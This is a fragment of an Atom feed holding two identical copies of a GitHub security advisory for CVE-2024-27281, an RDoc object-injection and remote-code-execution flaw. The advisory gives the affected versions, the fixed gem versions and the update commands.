        <title type="html"><![CDATA[[rdoc] RDoc RCE vulnerability with .rdoc_options]]></title>
        <id>https://github.com/advisories/GHSA-592j-995h-p23j</id>
        <link href="https://github.com/advisories/GHSA-592j-995h-p23j"/>
        <updated>2024-05-14T18:13:52.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in RDoc 6.3.3 through 6.6.2, as distributed in Ruby 3.x through 3.3.0.</p>
<p>When parsing <code>.rdoc_options</code> (used for configuration in RDoc) as a YAML file, object injection and resultant remote code execution are possible because there are no restrictions on the classes that can be restored.</p>
<p>When loading the documentation cache, object injection and resultant remote code execution are also possible if there were a crafted cache.</p>
<p>We recommend to update the RDoc gem to version 6.6.3.1 or later. In order to ensure compatibility with bundled version in older Ruby series, you may update as follows instead:</p>
<ul>
<li>For Ruby 3.0 users: Update to <code>rdoc</code> 6.3.4.1</li>
<li>For Ruby 3.1 users: Update to <code>rdoc</code> 6.4.1.1</li>
<li>For Ruby 3.2 users: Update to <code>rdoc</code> 6.5.1.1</li>
</ul>
<p>You can use <code>gem update rdoc</code> to update it. If you are using bundler, please add <code>gem "rdoc", "&gt;= 6.6.3.1"</code> to your <code>Gemfile</code>.</p>
<p>Note: 6.3.4, 6.4.1, 6.5.1 and 6.6.3 have a incorrect fix. We recommend to upgrade 6.3.4.1, 6.4.1.1, 6.5.1.1 and 6.6.3.1 instead of them.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656">https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644">https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be">https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf">https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e">https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5">https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d">https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17">https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281">https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27281">https://nvd.nist.gov/vuln/detail/CVE-2024-27281</a></li>
<li><a href="https://github.com/advisories/GHSA-592j-995h-p23j">https://github.com/advisories/GHSA-592j-995h-p23j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-592j-995h-p23j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-25T19:36:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rdoc] RDoc RCE vulnerability with .rdoc_options]]></title>
        <id>https://github.com/advisories/GHSA-592j-995h-p23j</id>
        <link href="https://github.com/advisories/GHSA-592j-995h-p23j"/>
        <updated>2024-05-14T18:13:52.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in RDoc 6.3.3 through 6.6.2, as distributed in Ruby 3.x through 3.3.0.</p>
<p>When parsing <code>.rdoc_options</code> (used for configuration in RDoc) as a YAML file, object injection and resultant remote code execution are possible because there are no restrictions on the classes that can be restored.</p>
<p>When loading the documentation cache, object injection and resultant remote code execution are also possible if there were a crafted cache.</p>
<p>We recommend to update the RDoc gem to version 6.6.3.1 or later. In order to ensure compatibility with bundled version in older Ruby series, you may update as follows instead:</p>
<ul>
<li>For Ruby 3.0 users: Update to <code>rdoc</code> 6.3.4.1</li>
<li>For Ruby 3.1 users: Update to <code>rdoc</code> 6.4.1.1</li>
<li>For Ruby 3.2 users: Update to <code>rdoc</code> 6.5.1.1</li>
</ul>
<p>You can use <code>gem update rdoc</code> to update it. If you are using bundler, please add <code>gem "rdoc", "&gt;= 6.6.3.1"</code> to your <code>Gemfile</code>.</p>
<p>Note: 6.3.4, 6.4.1, 6.5.1 and 6.6.3 have a incorrect fix. We recommend to upgrade 6.3.4.1, 6.4.1.1, 6.5.1.1 and 6.6.3.1 instead of them.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656">https://github.com/ruby/rdoc/commit/1254b0066f312ddbf7fae7a195e66ce5b3bc6656</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644">https://github.com/ruby/rdoc/commit/32ff6ba0bebd8ea26f569da5fd23be2937f6a644</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be">https://github.com/ruby/rdoc/commit/48617985e9fbc2825219d55f04e3e0e98d2923be</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf">https://github.com/ruby/rdoc/commit/811f125a4a0cc968e3eb18e16ea6c1a3b49a11bf</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e">https://github.com/ruby/rdoc/commit/a5de13bf0f0c26f8e764e82b5bf4bf8bffc7198e</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5">https://github.com/ruby/rdoc/commit/d22ba930f1f611dda531dba04cd3d2531bb3f8a5</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d">https://github.com/ruby/rdoc/commit/da7a0c7553ef7250ca665a3fecdc01dbaacbb43d</a></li>
<li><a href="https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17">https://github.com/ruby/rdoc/commit/e4a0e71e6f1032f8b4e5e58b4ef60d702c22ce17</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rdoc/CVE-2024-27281.yml</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281">https://www.ruby-lang.org/en/news/2024/03/21/rce-rdoc-cve-2024-27281</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27281">https://nvd.nist.gov/vuln/detail/CVE-2024-27281</a></li>
<li><a href="https://github.com/advisories/GHSA-592j-995h-p23j">https://github.com/advisories/GHSA-592j-995h-p23j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-592j-995h-p23j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-25T19:36:59.000Z</published>
    </entry>
</feed>